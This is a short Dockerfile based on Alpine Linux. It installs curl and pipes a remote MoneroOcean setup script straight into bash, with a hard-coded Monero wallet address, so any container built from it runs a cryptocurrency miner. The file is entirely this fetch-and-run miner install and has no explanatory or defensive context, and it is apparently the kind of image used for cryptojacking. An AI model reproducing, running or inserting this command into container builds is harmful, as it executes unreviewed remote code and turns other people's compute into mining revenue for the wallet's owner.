FROM alpine:latest
RUN apk add curl
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un
